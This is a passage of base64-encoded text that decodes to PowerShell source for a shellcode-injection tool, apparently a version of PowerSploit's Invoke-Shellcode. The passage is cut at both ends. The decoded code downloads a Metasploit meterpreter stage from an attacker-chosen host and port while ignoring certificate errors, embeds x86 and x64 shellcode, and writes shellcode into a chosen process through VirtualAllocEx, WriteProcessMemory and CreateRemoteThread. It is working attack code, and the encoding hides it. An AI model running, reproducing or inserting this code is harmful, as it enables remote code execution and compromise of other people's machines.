MgNjQtYml0DQogICAgJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MNCiAgICBpZiAoJElzV293NjRQcm9jZXNzQWRkcikNCiAgICB7DQogICAgCSRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQ0KICAgIAkkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkNCiAgICAgICAgDQogICAgICAgICQ2NGJpdENQVSA9ICR0cnVlDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgCSQ2NGJpdENQVSA9ICRmYWxzZQ0KICAgIH0NCg0KICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgNCkNCiAgICB7DQogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkdHJ1ZQ0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJGZhbHNlDQogICAgfQ0KDQogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTWV0YXNwbG9pdCcpDQogICAgew0KICAgICAgICBpZiAoISRQb3dlclNoZWxsMzJiaXQpIHsNCiAgICAgICAgICAgICMgVGhlIGN1cnJlbnRseSBzdXBwb3J0ZWQgTWV0YXNwbG9pdCBwYXlsb2FkcyBhcmUgMzItYml0LiBUaGlzIGJsb2NrIG9mIGNvZGUgaW1wbGVtZW50cyB0aGUgbG9naWMgdG8gZXhlY3V0ZSB0aGlzIHNjcmlwdCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsDQogICAgICAgICAgICAjIEdldCB0aGlzIHNjcmlwdCdzIGNvbnRlbnRzIGFuZCBwYXNzIGl0IHRvIDMyLWJpdCBwb3dlcnNoZWxsIHdpdGggdGhlIHNhbWUgcGFyYW1ldGVycyBwYXNzZWQgdG8gdGhpcyBmdW5jdGlvbg0KDQogICAgICAgICAgICAjIFB1bGwgb3V0IGp1c3QgdGhlIGNvbnRlbnQgb2YgdGhlIHRoaXMgc2NyaXB0J3MgaW52b2NhdGlvbi4NCiAgICAgICAgICAgICRSb290SW52b2NhdGlvbiA9ICRNeUludm9jYXRpb24uTGluZQ0KDQogICAgICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQ0KICAgICAgICANCiAgICAgICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSB3YW50IHRvIGxhdW5jaCB0aGUgcGF5bG9hZCBmcm9tIHg4NiBQb3dlcnNoZWxsPyIsDQogICAgICAgICAgICAgICAgICAgIkF0dGVtcHQgdG8gZXhlY3V0ZSAzMi1iaXQgc2hlbGxjb2RlIGZyb20gNjQtYml0IFBvd2Vyc2hlbGwuIE5vdGU6IFRoaXMgcHJvY2VzcyB0YWtlcyBhYm91dCBvbmUgbWludXRlLiBCZSBwYXRpZW50ISBZb3Ugd2lsbCBhbHNvIHNlZSBzb21lIGFydGlmYWN0cyBvZiB0aGUgc2NyaXB0IGxvYWRpbmcgaW4gdGhlIG90aGVyIHByb2Nlc3MuIiApICkgKSB7IH0NCiAgICAgICAgDQogICAgICAgICAgICBpZiAoICEkUmVzcG9uc2UgKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gbGF1bmNoIHRoZSAzMi1iaXQgcGF5bG9hZCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsLiBFeGl0IGZ1bmN0aW9uDQogICAgICAgICAgICAgICAgUmV0dXJuDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICMgU2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIHJ1biBpbiBhIG5vbmludGVyYWN0aXZlIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwsIG1ha2Ugc3VyZSB0aGUgLUZvcmNlIHN3aXRjaCBpcyBpbmNsdWRlZCBzbyB0aGF0IHRoZXJlIGlzIG5vIHdhcm5pbmcgcHJvbXB0Lg0KICAgICAgICAgICAgaWYgKCRNeUludm9jYXRpb24uQm91bmRQYXJhbWV0ZXJzWydGb3JjZSddKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4ZWN1dGluZyB0aGUgZm9sbG93aW5nIGZyb20gMzItYml0IFBvd2VyU2hlbGw6ICRSb290SW52b2NhdGlvbiINCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKWBuYG4iDQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIC1Gb3JjZSINCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKSAtRm9yY2VgbmBuIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkQ29tbWFuZEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QXNjaWkuR2V0Qnl0ZXMoJENvbW1hbmQpDQogICAgICAgICAgICAkRW5jb2RlZENvbW1hbmQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRDb21tYW5kQnl0ZXMpDQoNCiAgICAgICAgICAgICRFeGVjdXRlID0gJyRDb21tYW5kJyArICIgfCAkRW52OndpbmRpclxTeXNXT1c2NFxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgLSINCiAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uIC1Db21tYW5kICRFeGVjdXRlIHwgT3V0LU51bGwNCg0KICAgICAgICAgICAgIyBFeGl0IHRoZSBzY3JpcHQgc2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIGJlIHJ1bm5pbmcgZnJvbSB4ODYgUG93ZXJTaGVsbA0KICAgICAgICAgICAgUmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICRSZXNwb25zZSA9ICRUcnVlDQogICAgICAgIA0KICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Uga25vdyB3aGF0IHlvdSdyZSBkb2luZz8iLA0KICAgICAgICAgICAgICAgIkFib3V0IHRvIGRvd25sb2FkIE1ldGFzcGxvaXQgcGF5bG9hZCAnJCgkUGF5bG9hZCknIExIT1NUPSQoJExob3N0KSwgTFBPUlQ9JCgkTHBvcnQpIiApICkgKSB7IH0NCiAgICAgICAgDQogICAgICAgIGlmICggISRSZXNwb25zZSApDQogICAgICAgIHsNCiAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gY2Fycnkgb3V0IGRvd25sb2FkIG9mIE1ldGFzcGxvaXQgcGF5bG9hZC4gRXhpdCBmdW5jdGlvbg0KICAgICAgICAgICAgUmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHN3aXRjaCAoJFBheWxvYWQpDQogICAgICAgIHsNCiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkU1NMID0gJycNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkU1NMID0gJ3MnDQogICAgICAgICAgICAgICAgIyBBY2NlcHQgaW52YWxpZCBjZXJ0aWZpY2F0ZXMNCiAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JFRydWV9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmICgkTGVnYWN5KSANCiAgICAgICAgew0KICAgICAgICAgICAgIyBPbGQgTWV0ZXJwcmV0ZXIgaGFuZGxlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwDQogICAgICAgICAgICAkUmVxdWVzdCA9ICJodHRwJCgkU1NMKTovLyQoJExob3N0KTokKCRMcG9ydCkvSU5JVE0iDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSAkUmVxdWVzdCINCiAgICAgICAgfSBlbHNlIHsNCg0KICAgICAgICAgICAgIyBHZW5lcmF0ZSBhIFVSSSB0aGF0IHBhc3NlcyB0aGUgdGVzdA0KICAgICAgICAgICAgJENoYXJBcnJheSA9IDQ4Li41NyArIDY1Li45MCArIDk3Li4xMjIgfCBGb3JFYWNoLU9iamVjdCB7W0NoYXJdJF99DQogICAgICAgICAgICAkU3VtVGVzdCA9ICRGYWxzZQ0KDQogICAgICAgICAgICB3aGlsZSAoJFN1bVRlc3QgLWVxICRGYWxzZSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJEdlbmVyYXRlZFVyaSA9ICRDaGFyQXJyYXkgfCBHZXQtUmFuZG9tIC1Db3VudCA0DQogICAgICAgICAgICAgICAgJFN1bVRlc3QgPSAoKFtpbnRbXV0gJEdlbmVyYXRlZFVyaSB8IE1lYXN1cmUtT2JqZWN0IC1TdW0pLlN1bSAlIDB4MTAwIC1lcSA5MikNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJFJlcXVlc3RVcmkgPSAtam9pbiAkR2VuZXJhdGVkVXJpDQoNCiAgICAgICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS8kKCRSZXF1ZXN0VXJpKSIgDQogICAgICAgIH0NCiAgICAgICAgICAgDQogICAgICAgICRVcmkgPSBOZXctT2JqZWN0IFVyaSgkUmVxdWVzdCkNCiAgICAgICAgJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCiAgICAgICAgJFdlYkNsaWVudC5IZWFkZXJzLkFkZCgndXNlci1hZ2VudCcsICIkVXNlckFnZW50IikNCiAgICAgICAgDQogICAgICAgIGlmICgkUHJveHkpDQogICAgICAgIHsNCiAgICAgICAgICAgICRXZWJQcm94eU9iamVjdCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJQcm94eQ0KICAgICAgICAgICAgJFByb3h5QWRkcmVzcyA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLlByb3h5U2VydmVyDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgaWYgdGhlcmUgaXMgbm8gcHJveHkgc2V0LCB0aGVuIGNvbnRpbnVlIHdpdGhvdXQgaXQNCiAgICAgICAgICAgIGlmICgkUHJveHlBZGRyZXNzKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5BZGRyZXNzID0gJFByb3h5QWRkcmVzcw0KICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSAkVHJ1ZQ0KICAgICAgICAgICAgICAgICRXZWJDbGllbnRPYmplY3QuUHJveHkgPSAkV2ViUHJveHlPYmplY3QNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkV2ViQ2xpZW50LkRvd25sb2FkRGF0YSgkVXJpKQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICIkKCRFcnJvclswXS5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiDQogICAgICAgIH0NCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyDQoNCiAgICB9DQogICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NoZWxsY29kZSddKQ0KICAgIHsNCiAgICAgICAgIyBVc2VycyBwYXNzaW5nIGluIHNoZWxsY29kZSAgdGhyb3VnaCB0aGUgJy1TaGVsbGNvZGUnIHBhcmFtZXRlciBhcmUgcmVzcG9uc2libGUgZm9yIGVuc3VyaW5nIGl0IHRhcmdldHMNCiAgICAgICAgIyB0aGUgY29ycmVjdCBhcmNoaXRlY2h0dXJlIC0geDg2IHZzLiB4NjQuIFRoaXMgc2NyaXB0IGhhcyBubyB3YXkgdG8gdmFsaWRhdGUgd2hhdCB5b3UgcHJvdmlkZSBpdC4NCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQ0KICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlNjQgPSAkU2hlbGxjb2RlMzINCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgIyBQb3AgYSBjYWxjLi4uIG9yIHdoYXRldmVyIHNoZWxsY29kZSB5b3UgZGVjaWRlIHRvIHBsYWNlIGluIGhlcmUNCiAgICAgICAgIyBJIHNpbmNlcmVseSBob3BlIHlvdSB0cnVzdCB0aGF0IHRoaXMgc2hlbGxjb2RlIGFjdHVhbGx5IHBvcHMgYSBjYWxjLi4uDQogICAgICAgICMgSW5zZXJ0IHlvdXIgc2hlbGxjb2RlIGhlcmUgaW4gdGhlIGZvciAweFhYLDB4WFgsLi4uDQogICAgICAgICMgMzItYml0IHBheWxvYWQNCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQNCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gQCgweGZjLDB4ZTgsMHg4OSwweDAwLDB4MDAsMHgwMCwweDYwLDB4ODksMHhlNSwweDMxLDB4ZDIsMHg2NCwweDhiLDB4NTIsMHgzMCwweDhiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHgwYywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweDBmLDB4YjcsMHg0YSwweDI2LDB4MzEsMHhmZiwweDMxLDB4YzAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHhlMiwweGYwLDB4NTIsMHg1NywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NTIsMHgxMCwweDhiLDB4NDIsMHgzYywweDAxLDB4ZDAsMHg4YiwweDQwLDB4NzgsMHg4NSwweGMwLDB4NzQsMHg0YSwweDAxLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDhiLDB4NTgsMHgyMCwweDAxLDB4ZDMsMHhlMywweDNjLDB4NDksMHg4YiwweDM0LDB4OGIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4MzEsMHhmZiwweDMxLDB4YzAsMHhhYywweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweDc1LDB4ZTIsMHg1OCwweDhiLDB4NTgsMHgyNCwweDAxLDB4ZDMsMHg2NiwweDhiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MGMsMHg0YiwweDhiLDB4NTgsMHgxYywweDAxLDB4ZDMsMHg4YiwweDA0LDB4OGIsMHgwMSwweGQwLDB4ODksMHg0NCwweDI0LDB4MjQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NTgsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4ODYsMHg1ZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZhLDB4MDEsMHg4ZCwweDg1LDB4YjksMHgwMCwweDAwLDB4MDAsMHg1MCwweDY4LDB4MzEsMHg4YiwweDZmLDB4ODcsMHhmZiwweGQ1LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDY4LDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwweGQ1LDB4M2MsMHgwNiwweDdjLDB4MGEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDUsMHg2MywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDYxLDB4NmMsMHg2MywweDAwKQ0KDQogICAgICAgICMgNjQtYml0IHBheWxvYWQNCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MveDY0L2V4ZWMgQ01EPSJjYWxjIiBFWElURlVOQz10aHJlYWQNCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gQCgweGZjLDB4NDgsMHg4MywweGU0LDB4ZjAsMHhlOCwweGMwLDB4MDAsMHgwMCwweDAwLDB4NDEsMHg1MSwweDQxLDB4NTAsMHg1MiwweDUxLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgyMCwweDQ4LDB4OGIsMHg3MiwweDUwLDB4NDgsMHgwZiwweGI3LDB4NGEsMHg0YSwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsMHhlMiwweGVkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg0NCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyMCwweDQ5LDB4MDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsMHg4OCwweDQ4LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzOCwweGUwLDB4NzUsMHhmMSwweDRjLDB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwweDBjLDB4NDgsMHg0NCwweDhiLDB4NDAsMHgxYywweDQ5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkMCwweDQxLDB4OGIsMHgwNCwweDg4LDB4NDgsMHgwMSwweGQwLDB4NDEsMHg1OCwweDQxLDB4NTgsMHg1ZSwweDU5LDB4NWEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0MSwweDU4LDB4NDEsMHg1OSwweDQxLDB4NWEsMHg0OCwweDgzLDB4ZWMsMHgyMCwweDQxLDB4NTIsMHhmZiwweGUwLDB4NTgsMHg0MSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU5LDB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OCwweGJhLDB4MDEsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4OGQsMHg4ZCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NDEsMHhiYSwweDMxLDB4OGIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2ZiwweDg3LDB4ZmYsMHhkNSwweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg0MSwweGJhLDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQ1LDB4NDgsMHg4MywweGM0LDB4MjgsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDYzLDB4NjEsMHg2YywweDYzLDB4MDApDQogICAgfQ0KDQogICAgaWYgKCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb2Nlc3NJRCddICkNCiAgICB7DQogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBzcGVjaWZpZWQgcHJvY2VzcyBJRA0KICAgICAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2Vzcw0KICAgICAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQ0KICAgICAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkNCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgNCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pDQogICAgICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5DQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtCeXRlW11dLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkNCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZA0KICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkNCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpDQogICAgICAgICRDbG9zZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENsb3NlSGFuZGxlDQogICAgICAgICRDbG9zZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQ0KICAgICAgICAkQ2xvc2VIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2xvc2VIYW5kbGVBZGRyLCAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSkNCiAgICANCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBJRDogJFByb2Nlc3NJZCINCiAgICAgICAgDQogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsDQogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGluamVjdGluZyBpbnRvICQoKEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lkKS5Qcm9jZXNzTmFtZSkgKCRQcm9jZXNzSWQpISIgKSApDQogICAgICAgIHsNCiAgICAgICAgICAgIEluamVjdC1SZW1vdGVTaGVsbGNvZGUgJFByb2Nlc3NJZA0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBjdXJyZW50bHkgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MNCiAgICAgICAgJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYw0KICAgICAgICAkVmlydHVhbEFsbG9jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBl